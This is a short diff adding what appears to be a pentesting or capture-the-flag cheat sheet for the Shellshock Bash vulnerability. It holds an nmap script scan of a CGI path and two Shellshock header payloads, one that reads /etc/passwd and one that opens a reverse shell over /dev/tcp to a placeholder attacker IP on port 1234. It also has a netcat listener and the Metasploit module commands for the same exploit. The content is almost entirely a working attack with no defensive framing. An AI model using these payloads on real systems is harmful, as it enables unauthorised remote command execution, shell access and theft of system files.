@@ -1,0 +1,10 @@
+nmap -sV "IP" --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi"
+
+() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'
+() { :; }; echo; echo; /bin/bash -c 'cat -i>&/dev/tcp/"IP"/1234 0>&1'
+
+nc -nvlp 1234
+
+search shellshock
+use apache_mod_cgi_bash_env_exec
+set RHOSTS, TARGETURI
